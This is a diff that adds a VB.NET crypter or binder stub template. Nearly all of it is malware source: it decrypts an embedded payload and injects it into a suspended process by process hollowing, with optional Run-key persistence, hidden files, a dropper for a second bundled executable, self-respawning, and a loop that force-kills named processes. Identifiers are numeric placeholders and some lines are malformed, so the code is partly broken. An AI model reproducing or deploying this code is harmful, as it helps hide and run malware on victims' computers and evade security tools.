@@ -1,0 +1,305 @@
+Imports System, Microsoft.VisualBasic
+Imports Microsoft.Win32
+Imports System.Windows
+Imports System.Windows.Forms
+Imports System.Reflection
+Imports System.Text
+Imports System.Security.Cryptography
+Imports System.IO.Compression
+Imports System.IO
+Imports System.Diagnostics
+Imports System.Runtime.InteropServices
+Imports System.Collections
+Imports System.Collections.Generic
+Imports System.Data
+Imports System.Linq
+Imports System.Xml.Linqices
+
+'%ASSEMBLY%<Assembly: AssemblyTitle("%Title%")> 
+'%ASSEMBLY%<Assembly: AssemblyDescription("%Description%")> 
+'%ASSEMBLY%<Assembly: AssemblyCompany("%Company%")> 
+'%ASSEMBLY%<Assembly: AssemblyProduct("%Product%")> 
+'%ASSEMBLY%<Assembly: AssemblyCopyright("%Copyright%")> 
+'%ASSEMBLY%<Assembly: AssemblyTrademark("%Trademark%")> 
+'%ASSEMBLY%<Assembly: AssemblyFileVersion("%n1%" & "." & "%n2%" & "." & "%n3%" & "." & "%n4%")> 
+
+Public Class 222001
+	Shared success As Boolean = False
+    Shared retrycount = 0
+    Shared 222088 As Assembly = Assembly.GetExecutingAssembly()
+    Shared 222089 As New Resources.ResourceManager("Z", 222088)
+	'%Persist%	Shared Initialized As Integer = 0
+	'%Persist%	Shared Created As Integer = 0
+	'%Persist%	Shared persrun As System.Threading.Thread = New System.Threading.Thread(AddressOf QRunPE)
+
+    Public Shared Sub main()
+		'%PersistNOT% '%MessageBoxEnabled%	Messagebox()
+        '%PersistNOT% '%StartupEnabled%		Startup()
+		'%PersistNOT% 'BINDER				CheckBinder()
+		'%PersistNOT% 						QRunPE()
+		'%PersistNOT% '%Taskkill%			tkill.Start()
+
+		'%Persist%	persist()
+
+    End Sub
+
+	'%Taskkill%	Shared tkill As System.Threading.Thread = New System.Threading.Thread(AddressOf taskkill)
+	'%Taskkill%    Shared Sub taskkill()
+	'%Taskkill%		While True
+    '%Taskkill%        Dim tasklist As String = "%TASKLIST%"
+    '%Taskkill%        Dim tasklistarray() As String = Split(tasklist, "; ")
+    '%Taskkill%       For Each taskname As String In tasklistarray
+    '%Taskkill%            'MsgBox("%" & taskname & "%")
+    '%Taskkill%            Shell("taskkill /f /im " & taskname, 0)
+    '%Taskkill%        Next
+    '%Taskkill%        System.Threading.Thread.Sleep(1500)
+	'%Taskkill%		End While
+    '%Taskkill%    End Sub
+
+		    Shared Sub QRunPE()
+				Do
+			     Try
+			        Dim 222002 = New 222001()
+					Dim 222003 = 222002.222004()
+			        success = True
+			     Catch ex As Exception
+			       retrycount = retrycount + 1
+				   system.threading.thread.sleep(500)
+				   End Try
+				Loop Until success = True OrElse retrycount >= 5
+		    End Sub
+
+	'%Persist%	Shared Sub persist()
+		'%Persist%	Do
+        '%Persist%	    If Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName).Length = 1 And Initialized = 0 Then
+        '%Persist%	        '%MessageBoxEnabled%	Messagebox()
+		'%Persist%			'%StartupEnabled%		Startup()
+        '%Persist%	        'BINDER					CheckBinder()
+		'%Persist%			persrun.Start()
+        '%Persist%	        '%Taskkill%				tkill.Start()
+        '%Persist%	        'MsgBox("Run")
+        '%Persist%	        Initialized = 1
+		'%Persist%	    ElseIf Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName).Length = 2 And Initialized = 0 Then
+		'%Persist%			Created = 1
+        '%Persist%	    End If
+        '%Persist%	    PersistInitialize()
+		'%Persist%		'System.Threading.Thread.Sleep(200)
+        '%Persist%	Loop
+	'%Persist%	End Sub
+
+    '%Persist%	Shared Sub PersistInitialize()
+    '%Persist%	    Do
+    '%Persist%	        If Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName).Length = 1 And Initialized = 1 Then
+    '%Persist%	            Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location)
+    '%Persist%	            'System.Threading.Thread.Sleep(200)
+    '%Persist%	        ElseIf Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName).Length > 2 Then
+    '%Persist%	            End
+    '%Persist%	        ElseIf Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName).Length = 2 And Initialized = 1 Then
+    '%Persist%	            Exit Sub
+    '%Persist%	        ElseIf Process.GetProcessesByName(Process.GetCurrentProcess.ProcessName).Length = 1 And Initialized = 0 And Created = 1 Then
+	'%Persist%	            persrun.Start()
+	'%Persist%	            Initialized = 1
+    '%Persist%	            Process.Start(System.Reflection.Assembly.GetExecutingAssembly().Location)
+    '%Persist%	            tkill.Start()
+    '%Persist%	            Created = 0
+    '%Persist%	            Exit Sub
+    '%Persist%	        End If
+	'%Persist%	        Exit Sub
+    '%Persist%	    Loop
+    '%Persist%	End Sub
+
+
+'BINDER     Public Shared Function Dynamic(ByVal [Class] As System.Type, ByVal Method As String, ByVal Argument As Object())
+'BINDER         Dim Cls As Type = [Class]
+'BINDER         Dim Void As String = Method
+'BINDER         Dim obj As Object() = Argument
+'BINDER         Return Cls.InvokeMember(Void, System.Reflection.BindingFlags.InvokeMethod, Nothing, Nothing, obj)
+'BINDER    End Function
+
+'BINDER Shared Sub ExecBind()
+'BINDER     Dim RR As New Random
+'BINDER     Dim Path = IO.Path.GetTempPath & RR.Next(1, 99999) & "%Extension%"
+'BINDER     Dynamic(GetType(IO.File), "WriteAllBytes", New Object() {Path, Encoding.Default.GetBytes(222089.GetObject("SecondResource"))})
+'BINDER     Dynamic(GetType(Process), "Start", New Object() {Path})
+'BINDER End Sub
+
+'BINDER Shared Sub CheckBinder()
+'BINDER Dim BindFileRunOnce As Boolean = %OnceCheck%
+'BINDER     Dim x As System.Threading.Thread
+'BINDER     Dim xx As System.Threading.Thread
+'BINDER     
+'BINDER         If BindFileRunOnce = True Then
+'BINDER             If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\ICSG", "R", Nothing) Is Nothing Then : xx = New System.Threading.Thread(AddressOf ExecBind) : xx.Start() : Dim regkey = Registry.CurrentUser.OpenSubKey("SOFTWARE", True) : regkey.CreateSubKey("ICSG") : regkey.Close() : My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\ICSG", "R", "Ran") : End If
+'BINDER         Else
+'BINDER             x = New System.Threading.Thread(AddressOf ExecBind)
+'BINDER             x.Start()
+'BINDER         End If
+'BINDER
+'BINDER End Sub
+
+'%MessageBoxEnabled%    Public Shared Sub Messagebox()
+'%MessageBoxEnabled%        'Message Box
+'%MessageBoxEnabled%        Dim MessageBoxTitle As String = "%MessageBoxTitle%"
+'%MessageBoxEnabled%        Dim MessageBoxMessage As String = "%MessageBoxMessage%"
+'%MessageBoxEnabled%        Dim MessageBoxMethod As Integer = %MessageBoxMethod%
+'%MessageBoxEnabled%
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%	If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\SOFTWARE\ICSG", "M", Nothing) Is Nothing Then
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%		Dim regkey = Registry.CurrentUser.OpenSubKey("SOFTWARE", True)
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%		regkey.CreateSubKey("ICSG")
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%		regkey.Close()
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%		My.Computer.Registry.SetValue("HKEY_CURRENT_USER\SOFTWARE\ICSG", "M", "Ran")
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%		MsgBox(MessageBoxMessage, MessageBoxMethod, MessageBoxTitle)
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%	Else
+'%MessageBoxEnabled%        '%MessageBoxDisplayOnce%		Exit Sub : End If
+'%MessageBoxEnabled%
+'%MessageBoxEnabled%		MsgBox(MessageBoxMessage, MessageBoxMethod, MessageBoxTitle)
+'%MessageBoxEnabled%    End Sub
+
+'%StartupEnabled%   Public Shared Sub Startup()
+
+'%StartupEnabled%   Dim StartupMethod As Integer = "%StartupMethod%"
+'%StartupEnabled%   Dim StartupHideParentFolder As Boolean = False
+'%StartupEnabled%   Dim StartupHideEXEFile As Boolean = False
+'%StartupEnabled%   Dim StartupPhysicalPath As String = ""
+
+'%StartupEnabled%       If StartupMethod = "1" Then
+'%StartupEnabled%           If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "%APPNAME%-Launcher", Nothing) Is Nothing Then
+
+'%StartupEnabled%   '%StartupHideParentFolder% StartupHideParentFolder = True
+'%StartupEnabled%   '%StartupHideEXEFile% StartupHideEXEFile = True
+
+'%StartupEnabled%               StartupPhysicalPath = Environment.GetFolderPath(%StartupSpecialFolder%) & "%StartupPath%"
+'%StartupEnabled%               If Not System.IO.Directory.Exists(Path.GetDirectoryName(StartupPhysicalPath)) Then
+'%StartupEnabled%                   System.IO.Directory.CreateDirectory(Path.GetDirectoryName(StartupPhysicalPath))
+'%StartupEnabled%                   System.IO.File.Copy(Application.ExecutablePath, StartupPhysicalPath, True)
+'%StartupEnabled%               End If
+
+'%StartupEnabled%               If StartupHideEXEFile = True Then
+'%StartupEnabled%                   File.SetAttributes(StartupPhysicalPath, FileAttributes.Hidden)
+'%StartupEnabled%               End If
+
+'%StartupEnabled%               If StartupHideParentFolder = True Then
+'%StartupEnabled%   Dim StartupParentDirectory As String = Path.GetDirectoryName(StartupPhysicalPath)
+'%StartupEnabled%   Dim dirinfo As IO.DirectoryInfo = New IO.DirectoryInfo(StartupParentDirectory)
+'%StartupEnabled%                   dirinfo.Attributes = IO.FileAttributes.Hidden
+'%StartupEnabled%               End If
+'%StartupEnabled%               My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "%APPNAME%-Launcher", StartupPhysicalPath)
+'%StartupEnabled%           End If
+'%StartupEnabled%       End If
+'%StartupEnabled%   End Sub
+
+    Public Function 222004()
+        Dim 222005 As String
+        Dim 222006() As Byte
+
+        222005 = 222007(222089.GetObject("FirstResource"), "%EncryptionKey%")
+        222006 = 222017(222005)
+        222061(222006, Process.GetCurrentProcess.MainModule.FileName)
+
+    End Function
+
+    'AESDecryption
+
+    Public Function 222007(ByVal 222008 As String, ByVal 222009 As String) As String
+        Dim 222010 As New System.Security.Cryptography.RijndaelManaged
+        Dim 222011 As New System.Security.Cryptography.MD5CryptoServiceProvider
+        Dim 222012 As String = ""
+        Try
+            Dim 222013(31) As Byte
+            Dim 222014 As Byte() = 222011.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(222009))
+            Array.Copy(222014, 0, 222013, 0, 16)
+            Array.Copy(222014, 0, 222013, 15, 16)
+            222010.Key = 222013
+            222010.Mode = Security.Cryptography.CipherMode.ECB
+            Dim 222015 As System.Security.Cryptography.ICryptoTransform = 222010.CreateDecryptor
+            Dim 222016 As Byte() = Convert.FromBase64String(222008)
+            222012 = System.Text.ASCIIEncoding.ASCII.GetString(222015.TransformFinalBlock(222016, 0, 222016.Length))
+            Return 222012
+        Catch ex As Exception
+        End Try
+    End Function
+
+
+    'HEX-to-Byte
+
+    Function 222017(ByVal 222018 As String) As Byte()
+        Dim 222019
+        Dim 222020() As Byte
+        222018 = Replace(222018, " ", "")
+        ReDim 222020((Len(222018) \ 2) - 1)
+        For 222019 = 0 To UBound(222020) - 2
+            222020(222019) = CLng("&H" & Mid$(222018, 2 * 222019 + 1, 2))
+        Next
+        222017 = 222020
+    End Function
+
+    'runPE
+
+    Public Declare Function 222040 Lib "kernel32" Alias "LoadLibraryA" (ByVal 222070 As String) As IntPtr
+    Public Declare Function 222031 Lib "kernel32" Alias "GetProcAddress" (ByVal 222053 As IntPtr, ByVal 222070 As String) As IntPtr
+    Function 222048(Of T)(ByVal 222070 As String, ByVal 222068 As String) As T
+        Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(222031(222040(222070), 222068), GetType(T)), Object), T)
+    End Function
+    Delegate Function 222032(ByVal 222058 As IntPtr, ByVal 222046 As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
+    Delegate Function 222033(ByVal 222056 As IntPtr, ByVal 222043 As IntPtr) As UInteger
+    Delegate Function 222034(ByVal 222056 As IntPtr, ByVal 222043 As IntPtr, ByRef bufr As IntPtr, ByVal 222045 As Integer, ByRef 222073 As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean
+    Delegate Function 222035(ByVal 222059 As IntPtr, ByVal 222079 As IntPtr) As UInteger
+    Delegate Function 222036(ByVal 222058 As IntPtr, ByVal 222046 As UInteger()) As <MarshalAs(UnmanagedType.Bool)> Boolean
+    Delegate Function 222037(ByVal 222056 As IntPtr, ByVal 222021 As IntPtr, ByVal 222082 As IntPtr, ByVal 222023 As Integer, ByVal 222075 As Integer) As IntPtr
+    Delegate Function 222038(ByVal 222057 As IntPtr, ByVal 222086 As IntPtr, ByVal 222064 As Byte(), ByVal 222072 As UInteger, ByVal 222071 As Integer) As Boolean
+    Public Declare Auto Function 222039 Lib "kernel32" Alias "CreateProcessW" (ByVal 222041 As String, ByVal 222047 As StringBuilder, ByVal 222076 As IntPtr, ByVal 222083 As IntPtr, <MarshalAs(UnmanagedType.Bool)> ByVal 222062 As Boolean, ByVal 222049 As Integer, ByVal 222052 As IntPtr, ByVal 222050 As String, ByVal 222081 As Byte(), ByVal 222074 As IntPtr()) As <MarshalAs(UnmanagedType.Bool)> Boolean
+    Private Function 222077(ByVal 222065 As Long, Optional ByVal 222067 As Long = &H4) As Integer
+        Dim 222066 As IntPtr
+        Dim 222063 As Integer
+        Dim 222026 As 222034 = 222048(Of 222034)("ntdll", "NtReadVirtualMemory")
+        Call 222026(Process.GetCurrentProcess.Handle, 222065, 222066, 222067, 222063)
+        Return 222066
+    End Function
+    Public Function 222061(ByVal 222044 As Byte(), ByVal 222080 As String) As Boolean
+	    Try
+            Dim 222054 As GCHandle = GCHandle.Alloc(222044, GCHandleType.Pinned) : Dim hModuleBase As Integer = 222054.AddrOfPinnedObject : 222054.Free()
+            Dim 222076 As IntPtr = IntPtr.Zero
+            Dim 222084 As IntPtr() = New IntPtr(3) {}
+            Dim 222085 As Byte() = New Byte(67) {}
+            Dim 222069 As Integer = BitConverter.ToInt32(222044, 60)
+            Dim 222060 As Integer
+            Dim 222046 As UInteger() = New UInteger(178) {}
+            222046(0) = &H10002
+            222039(Nothing, New StringBuilder(222080), 222076, 222076, False, 4, 222076, Nothing, 222085, 222084)
+            Dim 222055 As Integer = (hModuleBase + 222077(hModuleBase + &H3C))
+            222060 = 222077(222055 + &H34)
+            Dim 222025 As 222033 = 222048(Of 222033)("ntdll", "NtUnmapViewOfSection")
+            222025(222084(0), 222060)
+            Dim 222029 As 222037 = 222048(Of 222037)("kernel32", "VirtualAllocEx")
+            Dim 222086 As IntPtr = 222029(222084(0), 222060, 222077(222055 + &H50), &H3000, &H40)
+            Dim 222078 As New IntPtr(BitConverter.ToInt32(222044, 222069 + &H34))
+            Dim 222082 As New IntPtr(BitConverter.ToInt32(222044, 222069 + 80))
+            Dim 222087 As Integer
+            Dim 222071 As Integer
+
+            Dim 222030 As 222038 = 222048(Of 222038)("ntdll", "NtWriteVirtualMemory")
+            222030(222084(0), 222086, 222044, CUInt(CInt(222077(222055 + &H54))), 222087)
+            For i As Integer = 0 To 222077(222055 + &H6, 2) - 1
+                Dim 222051 As Integer() = New Integer(9) {}
+                Buffer.BlockCopy(222044, (222069 + &HF8) + (i * 40), 222051, 0, 40)
+                Dim 222042 As Byte() = New Byte((222051(4) - 1)) {}
+                Buffer.BlockCopy(222044, 222051(5), 222042, 0, 222042.Length)
+                222082 = New IntPtr(222086.ToInt32() + 222051(3))
+                222078 = New IntPtr(222042.Length)
+                222030(222084(0), 222082, 222042, CUInt(222078), 222071)
+            Next i
+            Dim 222024 As 222032 = 222048(Of 222032)("ntdll", "NtGetContextThread")
+            222024(222084(1), 222046)
+            222030(222084(0), 222046(41) + &H8, BitConverter.GetBytes(222086.ToInt32()), CUInt(&H4), 222071)
+            222046(&H2C) = 222060 + 222077(222055 + &H28)
+            Dim 222028 As 222036 = 222048(Of 222036)("ntdll", "NtSetContextThread")
+            222028(222084(1), 222046)
+            Dim 222027 As 222035 = 222048(Of 222035)("ntdll", "NtResumeThread")
+            222027(222084(1), 0)
+        Catch ex As Exception
+            Return False
+        End Try
+        Return True
+    End Function
+
+End Class
